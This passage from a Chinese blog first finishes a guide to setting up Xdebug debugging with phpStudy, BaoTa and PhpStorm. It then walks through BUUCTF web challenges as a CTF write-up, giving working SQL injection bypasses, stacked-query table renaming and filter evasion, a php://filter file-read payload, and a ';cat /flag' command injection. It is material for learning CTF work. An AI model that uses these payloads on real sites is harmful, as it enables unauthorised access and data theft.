-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>
-
-        <h3 id="3-修改php-ini"   >
-          <a href="#3-修改php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-修改php-ini" class="headerlink" title="(3)修改php.ini"></a>(3)修改php.ini</h3>
-      <p>然后主界面设置-&gt;php.ini-&gt;单击对应版本，即可打开php.ini配置文件</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
-<p>打开之后，在最下面的xdebug设置如下</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>
-
-<p>这里参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  相关的会更加详细。</p>
-<p>主要是设置<code>xdebug.remote_handler</code>，<code>xdebug.remote_port</code>，<code>xdebug.remote_host</code>，<code>xdebug.profiler_enable</code>，<code>xdebug.idekey</code>，<code>xdebug.remote_enable</code></p>
-
-        <h3 id="4-网站路径设置"   >
-          <a href="#4-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-网站路径设置" class="headerlink" title="(4)网站路径设置"></a>(4)网站路径设置</h3>
-      <p>主界面网站-&gt;管理-&gt;修改-&gt;根目录，然后设置为在phpStorm中存放php文件的目录，没有的可以直接创建一个</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>
-
-        <h3 id="5-开启服务"   >
-          <a href="#5-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-开启服务" class="headerlink" title="(5)开启服务"></a>(5)开启服务</h3>
-      <p>phpStudy中开启对应的网站服务即可</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>
-
-        <h2 id="3-phpstorm设置"   >
-          <a href="#3-phpstorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstorm设置" class="headerlink" title="3.phpstorm设置"></a>3.phpstorm设置</h2>
-      
-        <h3 id="1-PHP版本选择"   >
-          <a href="#1-PHP版本选择" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHP版本选择" class="headerlink" title="(1)PHP版本选择"></a>(1)PHP版本选择</h3>
-      <p>版本选择之前我们的设置好的相关版本</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
-<p>这里的CLI interpreter需要选择phpStudy中的php，点击旁边的<code>...</code>按钮，找到对应的php.exe添加即可，大多的路径如下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>
-
-        <h3 id="2-xdebug配置"   >
-          <a href="#2-xdebug配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebug配置" class="headerlink" title="(2)xdebug配置"></a>(2)xdebug配置</h3>
-      <p>打开phpstorm，打开setting-&gt;PHP-&gt;Debug，xdebug配置如下，主要是端口对应</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
-<p>PHP-&gt;Debug-&gt;DBGp Proxy，进行相关设置</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>
-
-        <h3 id="3-服务器端配置"   >
-          <a href="#3-服务器端配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-服务器端配置" class="headerlink" title="(3)服务器端配置"></a>(3)服务器端配置</h3>
-      <p>setting-&gt;server</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071101687.png" alt="image-20220107110138638"></p>
-<p>没有的自行+号添加，名字自己定义</p>
-
-        <h3 id="4-配置php文件路径"   >
-          <a href="#4-配置php文件路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-配置php文件路径" class="headerlink" title="(4)配置php文件路径"></a>(4)配置php文件路径</h3>
-      <p>Run-&gt;Edit Configurations</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071108373.png" alt="image-20220107110807337"></p>
-<p>然后添加对应的调试路径</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071110934.png" alt="image-20220107111003896"></p>
-<p>对应设置</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071111653.png" alt="image-20220107111151592"></p>
-
-        <h2 id="4-开始调试"   >
-          <a href="#4-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开始调试" class="headerlink" title="4.开始调试"></a>4.开始调试</h2>
-      <p>然后在phpStorm中对应网站的目录下的文件即可下断点开始调试</p>
-
-        <h3 id="1-开始监听"   >
-          <a href="#1-开始监听" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-开始监听" class="headerlink" title="(1)开始监听"></a>(1)开始监听</h3>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071115224.png" alt="image-20220107111554195"></p>
-<p>设置好调试环境，然后点旁边的电话，使其变成如下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071116386.png" alt="image-20220107111631356"></p>
-
-        <h3 id="2-调试"   >
-          <a href="#2-调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-调试" class="headerlink" title="(2)调试"></a>(2)调试</h3>
-      <p>在文件中下断点，点击debug即可开始调试</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071124166.png" alt="image-20220107112446079"></p>
-
-        <h2 id="🔺Linux版本"   >
-          <a href="#🔺Linux版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺Linux版本" class="headerlink" title="🔺Linux版本"></a>🔺Linux版本</h2>
-      
-        <h2 id="1-前置安装-1"   >
-          <a href="#1-前置安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置安装-1" class="headerlink" title="1.前置安装"></a>1.前置安装</h2>
-      <p>用的也是PHPSTORM和宝塔linux</p>
-
-        <h2 id="2-宝塔linux设置"   >
-          <a href="#2-宝塔linux设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-宝塔linux设置" class="headerlink" title="2.宝塔linux设置"></a>2.宝塔linux设置</h2>
-      
-        <h3 id="1-安装xdebug"   >
-          <a href="#1-安装xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-安装xdebug" class="headerlink" title="(1)安装xdebug"></a>(1)安装xdebug</h3>
-      <p>安装好PHP之后，设置安装PHP的拓展</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131101953.png" alt="image-20220113110140841"></p>
-
-        <h3 id="2-配置php-ini"   >
-          <a href="#2-配置php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-配置php-ini" class="headerlink" title="(2)配置php.ini"></a>(2)配置php.ini</h3>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131102613.png" alt="image-20220113110241556"></p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">; 允许远程 可以为 On 或者 1 都表示启用 ， Off 和 0 表示关闭关闭</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">; 远程主机的 IP 这里我们填写，固定的 127.0.0.1 这里写的是PHPSTORM所在的那台机器上的IP</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">; 调试连接端口 请记住这个端口，后续会用到。此配置项默认值为 9000 ，但是通常 9000 端口被 fpm 占据 ，故更换端口。</span><br><span class="line">; 另外，请在你服务器的控制面板和服务器防火墙中开放这个端口的进出站。</span><br><span class="line">; 如果你是宝塔面板用户 请放行此端口。</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">; 接下来的值都是可选的，但是我推荐你使用</span><br><span class="line">; 连接 IDE 的 Key，请记住他，可以自己自定义，主要用来过滤请求。</span><br><span class="line">xdebug.idekey=PHPSTORM</span><br><span class="line">xdebug.remote_handler=dbgp</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable=On</span><br></pre></td></tr></table></div></figure>
-
-<p>参照</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.t1h2ua.cn/archives/69" >Linux内网服务器+宝塔+Xdebug远程调试配置 – T1h2ua’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>保存之后，重载一下配置</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131104394.png" alt="image-20220113110410355"></p>
-
-        <h3 id="3-网站路径设置"   >
-          <a href="#3-网站路径设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-网站路径设置" class="headerlink" title="(3)网站路径设置"></a>(3)网站路径设置</h3>
-      <p>宝塔Linux中点击网站，添加站点</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131105621.png" alt="image-20220113110540548"></p>
-<p>得到如下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131106699.png" alt="image-20220113110610661"></p>
-
-        <h3 id="4-开启服务"   >
-          <a href="#4-开启服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-开启服务" class="headerlink" title="(4)开启服务"></a>(4)开启服务</h3>
-      <p>记得把对应的服务打开，nginx/apache和php</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131107520.png" alt="image-20220113110735466"></p>
-
-        <h3 id="5-放行9001端口"   >
-          <a href="#5-放行9001端口" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-放行9001端口" class="headerlink" title="(5)放行9001端口"></a>(5)放行9001端口</h3>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131115950.png" alt="image-20220113111553907"></p>
-
-        <h2 id="3-phpStorm设置"   >
-          <a href="#3-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpStorm设置" class="headerlink" title="3.phpStorm设置"></a>3.phpStorm设置</h2>
-      <p>这里就都差不多，选择php版本，配置xdebug，配置Server，配置php文件路径，注意这里选取的端口为9001</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109452.png" alt="image-20220113110926412"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110087.png" alt="image-20220113111016050"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131109570.png" alt="image-20220113110938531"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131110947.png" alt="image-20220113111029912"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131112793.png" alt="image-20220113111210749"></p>
-<p>然后就可以调试了。</p>
-
-        <h1 id="二、数据库搭建"   >
-          <a href="#二、数据库搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、数据库搭建" class="headerlink" title="二、数据库搭建"></a>二、数据库搭建</h1>
-      
-        <h2 id="1-phpStudy设置"   >
-          <a href="#1-phpStudy设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpStudy设置" class="headerlink" title="1.phpStudy设置"></a>1.phpStudy设置</h2>
-      
-        <h3 id="1-创建数据库"   >
-          <a href="#1-创建数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建数据库" class="headerlink" title="(1)创建数据库"></a>(1)创建数据库</h3>
-      <p>设置数据库，没有就创建，鼠标碰到密码可以查看</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091150517.png" alt="image-20220109115051455"></p>
-
-        <h3 id="2-打开MySQL数据库"   >
-          <a href="#2-打开MySQL数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-打开MySQL数据库" class="headerlink" title="(2)打开MySQL数据库"></a>(2)打开MySQL数据库</h3>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091152262.png" alt="image-20220109115216201"></p>
-
-        <h2 id="2-phpStorm设置"   >
-          <a href="#2-phpStorm设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStorm设置" class="headerlink" title="2.phpStorm设置"></a>2.phpStorm设置</h2>
-      
-        <h3 id="1-设置"   >
-          <a href="#1-设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-设置" class="headerlink" title="(1)设置"></a>(1)设置</h3>
-      <p>view-&gt;Tool Windows-&gt;databases</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153202.png" alt="image-20220109115314160"></p>
-<p>然后创建一个连接</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091153527.png" alt="image-20220109115352472"></p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154448.png" alt="image-20220109115418414"></p>
-<p>对应输入host，账号密码即可</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091154268.png" alt="image-20220109115447217"></p>
-
-        <h3 id="2-查看控制"   >
-          <a href="#2-查看控制" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看控制" class="headerlink" title="(2)查看控制"></a>(2)查看控制</h3>
-      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091155976.png" alt="image-20220109115523944"></p>
-<p>view-&gt;tool windows-&gt;database之后，双击上面红框可以进入控制界面</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091156880.png" alt="image-20220109115615823"></p>
-<p>然后就正常了。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/BUU-1/">陪AZ的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-12</span></span></div></header><div class="post-body"><div class="post-excerpt"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/550880247?utm_id=0" >https://zhuanlan.zhihu.com/p/550880247?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   //SQL注入</p>
-
-        <h1 id="一、-极客大挑战-2019-EasySQL"   >
-          <a href="#一、-极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-极客大挑战-2019-EasySQL" class="headerlink" title="一、[极客大挑战 2019]EasySQL"></a>一、[极客大挑战 2019]EasySQL</h1>
-      <p>题目是一个登录页面</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281258184.png" alt="image-20220728125819044"></p>
-<p>首先考虑是否是SQL注入，通过查看网页源代码发现!</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281257822.png" alt="image-20220728125729780"></p>
-<p>是php写的</p>
-<p>于是直接在url后面输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php? username=aa&#x27;or&#x27;a&#x27;=&#x27;a&amp;&amp;password=aa&#x27;or&#x27;a&#x27;=&#x27;a</span><br></pre></td></tr></table></div></figure>
-
-<p>(PS: aa’也可以换成其他字符再加单引号‘，or后面的语句应该是始终为真，且注意加单引号，末尾的单引号不加)</p>
-<p>(PS:也可以直接在登录界面输入)</p>
-<p>最后解出！</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281259279.png" alt="image-20220728125902175"></p>
-
-        <h1 id="二、-极客大挑战-2019-Havefun-1"   >
-          <a href="#二、-极客大挑战-2019-Havefun-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、-极客大挑战-2019-Havefun-1" class="headerlink" title="二、[极客大挑战 2019]Havefun 1"></a>二、[极客大挑战 2019]Havefun 1</h1>
-      <p>打开界面是</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281300850.png" alt="image-20220728130052768"></p>
-<p>什么提示也没有，我们可以查看一下它的网页源代码</p>
-<p>在源代码的最后，可以看到这样几行注释：</p>
-<p>（PS：<!--   -->是html中的注释标志）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281301266.png" alt="image-20220728130119241"></p>
-<p>这是一段php代码，通过阅读发现是以GET方式传入cat,直接输出了cst的值，如果cat的值为dog，则将输出’Syc{cat_cat_cat_cat}’</p>
-<p>显然，有猫腻</p>
-<p>于是尝试着传入cat的值为dog，即</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?cat=dog</span><br></pre></td></tr></table></div></figure>
-
-<p>回车一下，我们可以惊讶地发现：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281302331.png" alt="image-20220728130224249"></p>
-<p>它它它，它出来了！</p>
-<p>解题成功！！！</p>
-
-        <h1 id="三、-ACTF2020-新生赛-Include-1"   >
-          <a href="#三、-ACTF2020-新生赛-Include-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、-ACTF2020-新生赛-Include-1" class="headerlink" title="三、[ACTF2020 新生赛]Include 1"></a>三、[ACTF2020 新生赛]Include 1</h1>
-      <p>刚打开就是一个很直接的画面：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281424123.png" alt="image-20220728142446965"></p>
-<p>点击tips</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281619370.png" alt="image-20220728161935315"></p>
-<p>显然，这是暗示，也是挑衅。注意这里的url格式，这不是文件源码，应想办法读取文件源码</p>
-<p>通过查阅资料（<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html%EF%BC%89" >https://www.cnblogs.com/wjrblogs/p/12285202.html）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-<p>于是得到</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
-
-<p>此时得到一堆奇奇怪怪的东西：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281459682.png" alt="image-20220728145944523"></p>
-<p>这是base64的编码输出，可以借助Cyberchef解密</p>
-<p>得：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281502243.png" alt="image-20220728150227071"></p>
-<p>最终，成功找出flag！</p>
-<p>解出！</p>
-
-        <h1 id="四、-强网杯-2019-随便注-1"   >
-          <a href="#四、-强网杯-2019-随便注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、-强网杯-2019-随便注-1" class="headerlink" title="四、[强网杯 2019]随便注 1"></a>四、[强网杯 2019]随便注 1</h1>
-      <p>打开后界面如下</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281508416.png" alt="image-20220728150850249"></p>
-<p>首先尝试一下提交 </p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></div></figure>
-
-<p>于是出现</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509707.png" alt="image-20220728150904532"></p>
-<p>再用单引号判断是否有sql注入</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281509461.png" alt="image-20220728150949317"></p>
-<p>出错了，则说明有sql注入</p>
-<p>（PS：用单引号判断是否有sql注入，即在参数后面加上单引号，如果页面返回错误，则存在。会因为单引号个数不匹配而报错）</p>
-<p>再查询一下表</p>
-<p>（PS：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，在分号后面加#，则表示结束）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281520159.png" alt="image-20220728152001997"></p>
-<p>再分别查看表的结构</p>
-<p>1919810931114514:</p>
-<p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></div></figure>
-
-<p>(PS:表名为数字时，要用反引号)</p>
-<p>(数字前后是反单引号，不是单引号)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521757.png" alt="image-20220728152100582"></p>
-<p>words:</p>
-<p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;show columns from words;</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281521643.png" alt="image-20220728152143473"></p>
-<p>显然，flag存在于1919810931114514表中</p>
-
-        <h3 id="法Ⅰ：可以通过修改表名来获取flag"   >
-          <a href="#法Ⅰ：可以通过修改表名来获取flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：可以通过修改表名来获取flag" class="headerlink" title="法Ⅰ：可以通过修改表名来获取flag"></a>法Ⅰ：可以通过修改表名来获取flag</h3>
-      <p>将表1919810931114514的名字改为words,flag列名字改为id，就能获取flag</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改表名(将表名user改为users)</span><br><span class="line">alter table user rename to users;</span><br><span class="line"></span><br><span class="line">修改列名(将字段名username改为name)</span><br><span class="line">alter table users change uesrname name varchar(30);</span><br></pre></td></tr></table></div></figure>
-
-<p>即</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;；alter table words rename to word1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</span><br></pre></td></tr></table></div></figure>
-
-<p>最后再输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281537442.png" alt="image-20220728153711380"></p>
-
-        <h3 id="法Ⅱ：利用open和handler"   >
-          <a href="#法Ⅱ：利用open和handler" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：利用open和handler" class="headerlink" title="法Ⅱ：利用open和handler"></a>法Ⅱ：利用open和handler</h3>
-      <p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;handler `1919810931114514` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></div></figure>
-
-<p>（PS：a可随意变换名称）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281528838.png" alt="image-20220728152844776"></p>
-
-        <h3 id="法Ⅲ：MySQL的预处理"   >
-          <a href="#法Ⅲ：MySQL的预处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：MySQL的预处理" class="headerlink" title="法Ⅲ：MySQL的预处理"></a>法Ⅲ：MySQL的预处理</h3>
-      <p>尝试一下输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281531577.png" alt="image-20220728153131520"></p>
-<p>得出括号里的一堆都被过滤掉了，可以利用预处理机制prepare和concat函数拼接获得select，再用exeute来执行，通过大写绕过</p>
-<p>输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;PREPARE st from concat(&#x27;sel&#x27;,&#x27;ect&#x27;,  &#x27;* from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>
-
-<p>（PS：括号里前两个单引号的内容合在一起应该是被过滤掉的东西，但必须分开）</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281532121.png" alt="image-20220728153220056"></p>
-<p>OVER！</p>
-
-        <h1 id="五、-ACTF2020-新生赛-Exec-1"   >
-          <a href="#五、-ACTF2020-新生赛-Exec-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、-ACTF2020-新生赛-Exec-1" class="headerlink" title="五、[ACTF2020 新生赛]Exec 1"></a>五、[ACTF2020 新生赛]Exec 1</h1>
-      <p>点开后</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281542627.png" alt="image-20220728154217574"></p>
-<p>ping，命令执行</p>
-<p>直接输入</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /flag</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281546660.png" alt="image-20220728154658611"></p>
-<p>flag就来了 </p>
-<p>PS:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ;ls   打开当前根目录</span><br><span class="line">ping ;ls \  列出根目录\下的所有目录</span><br><span class="line">ping ;cat \ 打开\下的文件</span><br></pre></td></tr></table></div></figure>
-
-<p>附：ping命令</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_50317371/article/details/110489711" >https://blog.csdn.net/m0_50317371/article/details/110489711</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-
-        <h1 id="六、-极客大挑战-2019-Secret-File-1"   >
-          <a href="#六、-极客大挑战-2019-Secret-File-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、-极客大挑战-2019-Secret-File-1" class="headerlink" title="六、[极客大挑战 2019]Secret File 1"></a>六、[极客大挑战 2019]Secret File 1</h1>
-      <p>打开就是</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281554720.png" alt="image-20220728155426652"></p>
-<p>熟练的查看源代码</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555520.png" alt="image-20220728155505451"></p>
-<p>点开瞧一瞧</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555262.png" alt="image-20220728155519172"></p>
-<p>再点击SECRET瞧一瞧</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281555511.png" alt="image-20220728155533470"></p>
-<p>果然，没那么简单~但这也是一种提示吧，让我们再回去即上一个界面看看</p>
-<p>抓个包试试</p>
-<p>(方法:退回上一界面，开启proxy，再点击SECRET)</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281616889.png" alt="image-20220728161627792"></p>
-<p>这已经是很明显的提示了，访问一下这个secr3t.php</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281617712.png" alt="image-20220728161702651"></p>
-<p>更明显了这个</p>
-<p>和“三”同理，读取文件源码</p>
